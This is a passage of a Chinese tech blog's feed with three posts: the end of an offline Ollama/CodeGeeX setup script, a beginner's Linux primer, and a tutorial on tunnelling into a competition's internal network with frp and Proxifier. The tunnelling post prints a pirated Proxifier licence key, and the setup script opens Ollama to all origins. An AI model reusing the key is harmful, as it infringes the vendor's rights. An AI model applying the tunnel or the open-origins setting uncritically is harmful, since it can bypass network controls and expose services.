title="懒人部署包"></a>懒人部署包</h2><p>​配合懒人包一起食用更佳~</p><p>​该脚本需要以管理员权限执行</p><p>​此前曾使用过ollama的不建议直接运行懒人脚本，这可能会使你原先下载的模型丢失</p><p>​在懒人包目录下打开命令行，按顺序依次执行命令即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">:: 安装 ollama</span><br><span class="line">OllamaSetup.exe</span><br><span class="line"></span><br><span class="line">:: 安装 VScode</span><br><span class="line">VSCodeUserSetup-x64-1.95.3.exe</span><br><span class="line"></span><br><span class="line">:: 安装 CodeGeeX 插件</span><br><span class="line">code --install-extension aminer.codegeex-2.19.0.vsix</span><br><span class="line"></span><br><span class="line">:: 移动模型</span><br><span class="line">xcopy &quot;models\*&quot; &quot;%HOMEPATH%\.ollama\models&quot; /E /I</span><br><span class="line"></span><br><span class="line">:: 设置环境变量</span><br><span class="line">setx OLLAMA_ORIGINS &quot;*&quot; /M</span><br><span class="line">setx OLLAMA_MODELS &quot;C:%HOMEPATH%\.ollama\models&quot; /M</span><br></pre></td></tr></table></figure><p>​最后在手动在VScode中按照上述离线部署的过程配置一下即可</p><p>​懒人包下载地址：<a href="https://www.alipan.com/s/cSGkaLH4Jyc">https://www.alipan.com/s/cSGkaLH4Jyc</a></p><hr><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhipu-ai.feishu.cn/wiki/X6qEwPfHXi0hSOkJUSKc6DkDnGN">离线模式教程：Ollama篇 - 飞书云文档</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Ollama </tag>
            
            <tag> CodeGeekX </tag>
            
            <tag> VScode </tag>
            
            <tag> LLM </tag>
            
            <tag> 离线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电子扫盲之Linux</title>
      <link href="/post/5d53a887.html"/>
      <url>/post/5d53a887.html</url>
      
        <content type="html"><![CDATA[<h1 id="电子扫盲系列之Linux"><a href="#电子扫盲系列之Linux" class="headerlink" title="电子扫盲系列之Linux"></a>电子扫盲系列之Linux</h1><h2 id="黑客文化、自由软件运动与开放源码运动"><a href="#黑客文化、自由软件运动与开放源码运动" class="headerlink" title="黑客文化、自由软件运动与开放源码运动"></a>黑客文化、自由软件运动与开放源码运动</h2><p>​Hacker一词最早起源于MIT的计算机文化，有那么一些热衷于研究电脑勇于探索新技术的程序员，会把一些关于编程的新奇想法和骚操作被称为Hack，他们不称呼自己为Programmer(程序员)，而是自称Hacker，因此Hacker原指热心于计算机技术，水平高超的电脑专家，尤其是程序设计人员。而哪些那些专门利用电脑搞破坏或恶作剧的家伙，正确称呼应该是Cracker(骇客)</p><p>​黑客文化的核心在于解决问题，打破常规，质疑一切，自由分享</p><p>​                            </p><p>​自由软件的英文为“free software”。“free”在英文中有“自由”(freedom)、“免费”(free of charge)的双重含义，因此要学会分辨“自由软件”（free software）和“免费软件”（freeware）。自由软件运动的创始人——<a href="https://baike.baidu.com/item/%E7%90%86%E6%9F%A5%E5%BE%B7%C2%B7%E6%96%AF%E6%89%98%E6%9B%BC/486922?fromModule=lemma_inlink">理查德·斯托曼</a>提供了以下的定义：“free software” is a matter of liberty, not price. To understand the concept, you should think of “free” as in “free speech,” not as in “free beer”，中文译文：自由软件的重点在于自由，而非价格。要了解其所代表的概念：应该将“free”想成是“free speech”（言论自由）中的“free”（自由），而不是“free beer”（免费啤酒）中的“free”（免费）。更精确的说，自由软件代表电脑使用者拥有选择和任何人合作之自由、拥有掌控他们所用的软件之自由。在GNU宣言（GNU Manifesto）中包含了斯托曼在一开始对自由软件使用定义的混淆。</p><p>​Linus Torvalds创建Linux以来，开源思想在软件界可谓盛极一时。简单的说”开源软件”就是源代码开放的软件。只要符合开源软件定义的软件就能被称为开放源代码软件。自由软件是一个比开源软件更严格的概念，因此所有自由软件都是开放源代码的，但不是所有的开源软件都能被称为“自由”。开放源代码作用是尽可能的使软件最优化；自由软件则将自由作为道德标准。</p><p>​由于开源思想源于计算机软件界，所以发展至今，计算机类开源产品的种类、数量都是很多的，使用也比较广泛。如在操作系统领域，Linux在服务器市场就占据了相当大的份额，并持续扩张，IBM公司销售的薄片式服务器中大约有75%就运行着Linux操作系统；Web方面，全球有百分之五十以上的Web服务器在使用开源的Apache系统；数据库，有针对互联网应用的轻量级数据库MySQL，也有针对大型应用的PostgreSQL。</p><p>​开源被很多黑客认为是计算机科学的一种文化复兴，是计算机科学真正成为科学并能够与其他科学一起同步发展的手段。开源发展到今天，不仅仅有数以万计的黑客在积极地参与，像IBM、HP、CA、SUN等一些软硬件厂商也在加大在开源方面的投入并积极向开源社区贡献优秀开源软件，因为开源催化了软件业快速向服务也蜕变的速度并为IBM这样的硬件和集成服务提供商提供了新的商机。</p><h2 id="UNIX哲学"><a href="#UNIX哲学" class="headerlink" title="UNIX哲学"></a>UNIX哲学</h2><p>做一件事，并把它做好</p><p>Do One Thing，And Do It Well</p><h3 id="McUnix"><a href="#McUnix" class="headerlink" title="McUnix"></a>McUnix</h3><p>规则一：你永远不会知道你的程序会在什么地方耗费时间。程序的瓶颈常常出现在意想不到的地方，因此在你确信找到瓶颈后再动手优化代码吧。</p><p>规则二：测试代码。只有在你详细测试了代码，并且发现一部分代码耗费了绝大部分的运行时间时再对程序作速度优化。</p><p>规则三：功能全面的算法（fancy algorithm）在处理小规模问题时效率很低，这是因为算法时间效率中的常量很大，而问题往往规模很小。除非你知道你遇到的常常是复杂的情况，否则就让代码丑陋但是简单而高效吧。（即使问题规模确实很大，也首先尝试第二条规则。）</p><p>规则四：功能全面的算法比简单的算法更容易产生Bug，更难实现。尽量使用简单的算法和数据结构。</p><p>规则五：数据决定一切。如果选择的数据结构能很好的管理数据，算法部分往往不言自明。记住，数据结构，而非算法，才是编程的关键。</p><p>规则六：没有第六条规则。</p><ul><li></li></ul><h2 id="各发行版"><a href="#各发行版" class="headerlink" title="各发行版"></a>各发行版</h2><h3 id="按照包管理器划分"><a href="#按照包管理器划分" class="headerlink" title="按照包管理器划分"></a>按照包管理器划分</h3><p>主要可分为:</p><ol><li><p>Debian系 (Debian, Ubuntu, deepin, elementary, KaliLinux等）</p></li><li><p>RedHat系 (Fedora, RHEL, CentOS等)</p></li><li><p>RedHat外的rpm系 (SUSE和OpenSUSE)</p></li><li><p>Arch系 (ArchLinux, ManjaroLinux等)</p></li></ol><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览<img src="/../post_img/d4b3aee9190f714612c26802a43356c3/d9394693ada7a5d1af82dc88e9f76cd2.png" alt="d9394693ada7a5d1af82dc88e9f76cd2"></h3><p><img src="/../post_img/d4b3aee9190f714612c26802a43356c3/image-20241125132616983.png" alt="image-20241125132616983"></p><p><img src="/../post_img/d4b3aee9190f714612c26802a43356c3/image-20241125133308773.png" alt="image-20241125133308773"></p><ul><li></li></ul><h3 id="详尽版"><a href="#详尽版" class="headerlink" title="详尽版"></a>详尽版<img src="/../post_img/d4b3aee9190f714612c26802a43356c3/detail.png" alt="detail"></h3><ul><li></li></ul><h3 id="主流常用发行版"><a href="#主流常用发行版" class="headerlink" title="主流常用发行版"></a>主流常用发行版</h3><h4 id="Debian"><a href="#Debian" class="headerlink" title="Debian"></a>Debian</h4><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul><li>以稳定性、安全性和自由软件哲学而闻名</li><li>使用apt作为包管理器，使用.deb格式的软件包</li></ul><h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h5><ul><li>以用户友好和易于安装而闻名</li><li>理想的操作系统桌面系统</li><li>对于Ubuntu的硬件支持最广泛</li><li>使用apt作为包管理器，使用.deb格式的软件包</li></ul><h4 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h4><h5 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h5><ul><li>面向专业的渗透测试和安全审计，内置许多安全测试工具</li><li>每季度更新，有基于ARM架构的镜像，可用于树莓派和ARM系统</li></ul><h4 id="OpenSUSE"><a href="#OpenSUSE" class="headerlink" title="OpenSUSE"></a>OpenSUSE</h4><h5 id="特点-3"><a href="#特点-3" class="headerlink" title="特点"></a>特点</h5><ul><li>被评价为：最华丽的Linux发行版</li><li>面向企业级的Linux发行版</li><li>使用Libzypp作为包管理器</li></ul><h4 id="CentOS-RHEL"><a href="#CentOS-RHEL" class="headerlink" title="CentOS&#x2F;RHEL"></a>CentOS&#x2F;RHEL</h4><h5 id="特点-4"><a href="#特点-4" class="headerlink" title="特点"></a>特点</h5><ul><li>适合于服务器环境，在企业服务器和生产环境中非常流行</li><li>使用yum或dnf作为包管理器，使用.rpm格式软件包</li></ul><h4 id="Arch-Linux"><a href="#Arch-Linux" class="headerlink" title="Arch Linux"></a>Arch Linux</h4><h5 id="特点-5"><a href="#特点-5" class="headerlink" title="特点"></a>特点</h5><ul><li>极简设计、允许用户高度自定义</li><li>面向有经验用户设计</li><li>更加激进，更新频繁</li><li>使用Pacman包管理器</li></ul><h2 id="windows下使用Linux的两种方案"><a href="#windows下使用Linux的两种方案" class="headerlink" title="windows下使用Linux的两种方案"></a>windows下使用Linux的两种方案</h2><h3 id="VMware"><a href="#VMware" class="headerlink" title="VMware"></a>VMware</h3><p>​<a href="https://blog.csdn.net/weixin_74195551/article/details/127288338">安装虚拟机（VMware）保姆级教程（附安装包）</a></p><h3 id="wsl"><a href="#wsl" class="headerlink" title="wsl"></a>wsl</h3><p>​<a href="https://blog.csdn.net/weixin_45027467/article/details/106862520">WSL使用史上最详细教程</a></p><h2 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h2><h3 id="文件与目录操作"><a href="#文件与目录操作" class="headerlink" title="文件与目录操作"></a>文件与目录操作</h3><ul><li><code>ls</code>：列出目录内容。</li><li><code>cd</code>：改变当前工作目录。</li><li><code>pwd</code>：显示当前工作目录的路径。</li><li><code>mkdir</code>：创建新目录。</li><li><code>rmdir</code>：删除空目录。</li><li><code>rm</code>：删除文件或目录（使用 <code>-r</code> 选项可以递归删除非空目录）。</li><li><code>cp</code>：复制文件或目录。</li><li><code>mv</code>：移动或重命名文件或目录。</li><li><code>touch</code>：更新文件访问时间和修改时间，或创建新的空文件。</li></ul><h3 id="文件查看与编辑"><a href="#文件查看与编辑" class="headerlink" title="文件查看与编辑"></a>文件查看与编辑</h3><ul><li><code>cat</code>：显示文件内容，也可用于合并文件。</li><li><code>less</code> 或 <code>more</code>：分页显示文件内容。</li><li><code>head</code>：显示文件头部内容，默认前10行。</li><li><code>tail</code>：显示文件尾部内容，默认后10行，可用 <code>-f</code> 实时查看文件更新。</li><li><code>nano</code> 或 <code>vim</code>：文本编辑器。</li></ul><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ul><li><code>uname</code>：显示系统信息，如内核版本。</li><li><code>top</code> 或 <code>htop</code>：显示活动进程和系统资源使用情况。</li><li><code>df</code>：显示磁盘空间使用情况。</li><li><code>du</code>：显示目录或文件的磁盘使用情况。</li><li><code>free</code>：显示内存使用情况。</li></ul><h3 id="用户与权限"><a href="#用户与权限" class="headerlink" title="用户与权限"></a>用户与权限</h3><ul><li><code>whoami</code>：显示当前用户名。</li><li><code>su</code>：切换用户，通常用于切换到 root 用户。</li><li><code>sudo</code>：以超级用户或其他用户权限执行命令。</li><li><code>chmod</code>：更改文件或目录的权限。</li><li><code>chown</code>：更改文件或目录的所有者。</li></ul><h3 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h3><ul><li><code>ifconfig</code> 或 <code>ip addr</code>：显示或配置网络接口。</li><li><code>ping</code>：测试主机间的连通性。</li><li><code>netstat</code>：显示网络状态，包括连接、路由表、接口统计等。</li><li><code>ssh</code>：安全地远程登录到另一台计算机。</li><li><code>scp</code>：安全地在两台计算机之间复制文件。</li></ul><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><ul><li><code>ps</code>：显示当前进程的状态。</li><li><code>kill</code>：发送信号给进程，通常是终止进程。</li><li><code>pkill</code>：通过名称向进程发送信号。</li></ul><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><ul><li><code>find</code>：在指定目录下搜索文件。</li><li><code>grep</code>：搜索文件中匹配特定模式的行。</li></ul><h3 id="压缩与解压"><a href="#压缩与解压" class="headerlink" title="压缩与解压"></a>压缩与解压</h3><ul><li><code>tar</code>：用于打包和解包文件，支持多种压缩格式。</li><li><code>gzip</code> 和 <code>gunzip</code>：压缩和解压缩 <code>.gz</code> 文件。</li><li><code>zip</code> 和 <code>unzip</code>：压缩和解压缩 <code>.zip</code> 文件。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frp+Proxifier反向代理实现内网穿透</title>
      <link href="/post/9662863a.html"/>
      <url>/post/9662863a.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​近期被某个抽象比赛的虚拟机卡红温了，而又因为线下赛主赛场在外地，我们只能使用这个赛方提供的虚拟机远程接入比赛内网，体验很不好，于是想着搞内网穿透了。</p><hr><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>​已知有三台机器ABC，A为本机，B为赛方提供的可连接公网并可访问内网的跳板机，C则为内网服务器。</p><p>​正常来说，我们通过本机是无法直接访问到C这个内网服务器的，这时候就需要用到内网穿透，让B这个跳板机作为中间商进行流量的转发。</p><p>​在赛时完成整套搭建后，实际上有4台主机参与了整个交互：</p><ul><li><p>非内网主机A</p></li><li><p>内网跳板机B</p></li><li><p>内网服务器C</p></li><li><p>公网服务器D</p><p>A本地安装<code>Proxifier</code>通过D进行代理</p><p>D上安装Frp服务端双向接受来自A和B的信息</p><p>B上安装Frp客户端，作为被代理的一方，与C直接交互</p><p>最终实现A可以直接访问C</p></li></ul><hr><h2 id="Frp反向代理-Proxifier实现内网穿透"><a href="#Frp反向代理-Proxifier实现内网穿透" class="headerlink" title="Frp反向代理+Proxifier实现内网穿透"></a>Frp反向代理+Proxifier实现内网穿透</h2><p>​最终我选择的解决方案使用<code>Frp</code>进行反向代理，并使用<code>Proxifier</code>实现本地客户端的全局代理。</p><p>​需要明确的是，服务端指的是你所连接的公网服务器，客户端是实际需要被内网穿透的跳板机。</p><p>​简单来说公网服务器就是服务端，能够访问内部局域网服务的就是客户端，客户端可以是你的本机，也可以是一个跳板机。</p><p>​你首先需要：</p><ul><li>一台有着公网IP的服务器；</li><li><a href="https://github.com/fatedier/frp/releases/tag/v0.36.2">Frp (V36.2)</a>客户端与服务端；</li><li><a href="https://www.proxifier.com/download/ProxifierSetup.exe">Proxifier</a>客户端 (亲测可用的密钥：<code>5EZ8G-C3WL5-B56YG-SCXM9-6QZAP</code>)。</li></ul><hr><h3 id="Frp搭建"><a href="#Frp搭建" class="headerlink" title="Frp搭建"></a>Frp搭建</h3><p>​首先你需要选择对应系统版本的Frp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -m<span class="comment"># 查看linux系统架构</span></span><br></pre></td></tr></table></figure><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>​以下以<code>unbuntu22.04</code>作为服务端为例。</p><h5 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h5><p>​首先将下载的Frp文件上传至你的公网服务器中。</p><p>​依次执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> /opt/frp  <span class="comment"># 存放软件路径</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> frp_0.36.2_linux_amd64.tar.gz /opt/frp<span class="comment"># 移动Frp文件</span></span><br><span class="line"><span class="built_in">cd</span> /opt/frp<span class="comment"># 进入该目录</span></span><br><span class="line"><span class="built_in">sudo</span> tar -zxvf frp_0.36.2_linux_amd64.tar.gz<span class="comment"># 解压</span></span><br><span class="line"><span class="built_in">cd</span> frp_0.36.2_linux_amd64<span class="comment"># 进入解压后文件目录</span></span><br><span class="line"><span class="built_in">rm</span> -r frpc*<span class="comment"># 清除frpc开头文件(这是客户端组件，服务端不需要)</span></span><br></pre></td></tr></table></figure><p>​成功完成所需文件准备。</p><p>​然后需要进行配置文件设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim frps.ini</span><br></pre></td></tr></table></figure><p>​将文件内容修改为这样的基础配置，可根据自身情况进行修改：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">bind_udp_port</span> = <span class="number">7001</span></span><br><span class="line"><span class="attr">auto_token</span> = yourtoken</span><br><span class="line"></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="attr">dashboard_user</span> = user</span><br><span class="line"><span class="attr">dashboard_pwd</span> = password</span><br></pre></td></tr></table></figure><p>​解释：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span><span class="comment"># 绑定的端口，frp将会监听7000端口</span></span><br><span class="line"><span class="attr">bind_udp_port</span> = <span class="number">7001</span><span class="comment"># 绑定的udp端口，frp将会在7001监听udp请求</span></span><br><span class="line"><span class="attr">auto_token</span> = yourtoken<span class="comment"># 作为验证的token，客户端与服务端token相同才会连接</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span><span class="comment"># 监控面板端口为7500</span></span><br><span class="line"><span class="attr">dashboard_user</span> = user<span class="comment"># 登录监控面板的账户为user</span></span><br><span class="line"><span class="attr">dashboard_pwd</span> = password<span class="comment"># 登录监控面板的密码为password</span></span><br></pre></td></tr></table></figure><p>​同时如果是云服务器，需要在云服务器的安全组中放行对应端口。</p><p>​如果开启了防火墙，需要放行开放的端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=7000/tcp --permanent<span class="comment">#开放7000端口，其他端口也依次开放</span></span><br><span class="line">firewall-cmd --reload    <span class="comment">#重新加载防火墙</span></span><br><span class="line">firewall-cmd --list-all<span class="comment">#查看防火墙信息，检查所需端口是否开放</span></span><br></pre></td></tr></table></figure><p>​尝试运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p><img src="/../post_img/1de118a4d0459d362fecb2455cd3c6ff/image-20241019145725172.png" alt="image-20241019145725172"></p><p>​像这样便是成功运行了。</p><p>​如果运行报错，大概率是frp版本有误，重新检查一下该选择哪个架构版本。</p><h5 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h5><p>​接下来可配置开机自启动，临时用一下就不需要了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /lib/systemd/system/frps.service</span><br></pre></td></tr></table></figure><p>​将文件内容修改为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=frps service</span><br><span class="line"><span class="attr">After</span>=network.target syslog.target</span><br><span class="line"><span class="attr">Wants</span>=network.target</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">TimeoutStartSec</span>=<span class="number">30</span></span><br><span class="line"><span class="attr">ExecStart</span>=<span class="string">&#x27;ADDRESS&#x27;</span>/frps -c <span class="string">&#x27;ADDRESS&#x27;</span>/frps.ini<span class="comment"># 修改&#x27;ADDRESS&#x27;为frps.ini所在目录的绝对路径</span></span><br><span class="line"><span class="attr">ExecStop</span>=/bin/kill <span class="variable">$MAINPID</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure><p>​然后重载服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>​基本操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl start frps<span class="comment">#启动frps</span></span><br><span class="line">systemctl stop frps<span class="comment">#停止frps</span></span><br><span class="line">systemctl status frps<span class="comment">#查看frps运行状态</span></span><br><span class="line">systemctl <span class="built_in">enable</span> frps<span class="comment">#设置frps开机自启动  </span></span><br><span class="line">systemctl <span class="built_in">disable</span> frps<span class="comment">#取消frps开机自启动</span></span><br></pre></td></tr></table></figure><hr><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>​以下以<code>window11</code>作为客户端为例。</p><h5 id="基础配置-1"><a href="#基础配置-1" class="headerlink" title="基础配置"></a>基础配置</h5><p>​首先将frp文件下载到合适的位置并解压，进入到解压后的目录，并在该目录处打开终端。</p><p>​同样的，删除<code>frps</code>开头的文件，这些是服务端的组件，客户端不需要。</p><p>​打开<code>frpc.ini</code>修改内容为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = xxx.xxx.xx.xxx</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">auto_token</span> = frptoken</span><br><span class="line"><span class="attr">tls_enable</span> = ture</span><br><span class="line"></span><br><span class="line"><span class="section">[plugin socks]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7499</span></span><br><span class="line"><span class="attr">plugin_user</span> = username</span><br><span class="line"><span class="attr">plugin_passwd</span> = password</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>​解释：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = xxx.xxx.xx.xxx<span class="comment"># 你的服务端公网ip</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span><span class="comment"># 服务端绑定的端口号</span></span><br><span class="line"><span class="attr">auto_token</span> = frptoken<span class="comment"># 服务端中设置的token值</span></span><br><span class="line"><span class="attr">tls_enable</span> = ture<span class="comment"># 启用tls加密连接</span></span><br><span class="line"></span><br><span class="line"><span class="section">[plugin socks]</span><span class="comment"># 使用socks进行全局代理</span></span><br><span class="line"><span class="attr">type</span> = tcp<span class="comment"># 数据传输类型为tcp</span></span><br><span class="line"><span class="attr">plugin</span> = socks5<span class="comment"># 使用的插件为socks5</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7499</span><span class="comment"># 代理的端口为7499</span></span><br><span class="line"><span class="attr">plugin_user</span> = username<span class="comment"># 连接的用户名</span></span><br><span class="line"><span class="attr">plugin_passwd</span> = password<span class="comment"># 连接的密码</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span><span class="comment"># 开启数据加密，你也可以关闭</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span><span class="comment"># 开启压缩数据，可关闭</span></span><br></pre></td></tr></table></figure><p>​启动服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><p>​没有报错的话，应该就已经实现了内网穿透，其他主机可以通过服务端socks5进行代理后就可以访问到该客户端的内网服务了</p><hr><h3 id="Proxifier的使用"><a href="#Proxifier的使用" class="headerlink" title="Proxifier的使用"></a>Proxifier的使用</h3><p>​<code>Proxifier</code>是一个知名的代理工具，它允许用户将网络应用程序通过代理服务器进行连接。它本身只是一个代理管理的工具，可以设置和管理代理连接，但并不提供代理服务器。</p><p>​下载安装好<code>Proxifier</code>后，确保服务端与客户端服务均是开启状态。</p><p>​依次点击<code>Profile -&gt; Proxy Serves -&gt; add</code>，然后在<code>address</code>栏输入服务端<code>ip</code>，和<code>frpc.ini</code>中设置的<code>remote_port</code>，<code>Protocol</code>选择为<code>socks5</code></p><p><img src="/../post_img/1de118a4d0459d362fecb2455cd3c6ff/image-20241019165410522.png" alt="image-20241019165410522"></p><p>​勾选上<code>Enable</code>，用户名和密码是<code>frpc.ini</code>中设置的，最后点击<code>check</code>测试连接</p><p>​<img src="/../post_img/1de118a4d0459d362fecb2455cd3c6ff/image-20241019165520110.png" alt="image-20241019165520110"></p><p>​测试通过说明已经成功连接上了，点击<code>OK</code>保存</p><p>​最后打开<code>Profile -&gt; Procification Rules</code>，将<code>Action</code>选项中选择刚刚保存的代理服务器并点击<code>OK</code>保存即可</p><p><img src="/../post_img/1de118a4d0459d362fecb2455cd3c6ff/image-20241019165602553.png" alt="image-20241019165602553"></p><p>​<img src="/../post_img/1de118a4d0459d362fecb2455cd3c6ff/image-20241019165648425.png" alt="image-20241019165648425"></p><p>​为了避免流量较大，一般来说会将<code>Target Hosts</code>设置为内网ip，参考设置：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">localhost</span>; <span class="number">127.0.0.1</span>; %ComputerName%; ::<span class="number">1</span>;<span class="number">10</span>.*.*.*;<span class="number">172</span>.*.*.*;<span class="number">192</span>.<span class="number">168</span>.*.*;</span><br></pre></td></tr></table></figure><p>​完成所有配置后，此时如果在客户端中的局域网开启了一个WEB服务，那么公网其他主机便可以使用Proxifier通过服务端socks5的代理直接访问到内网的WEB服务。</p><p>​在linux中可使用<code>ProxyChains</code>，此处不再赘述。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cnblogs.com/zbyisgudi/p/18284790">基于frp的内网穿透搭建指南 - zbyisgudi - 博客园 (cnblogs.com)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 内网穿透 </tag>
            
            <tag> frp </tag>
            
            <tag> proxifier </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP书写指南</title>
      <link href="/post/45ab8fde.html"/>
      <url>/post/45ab8fde.html</url>
      
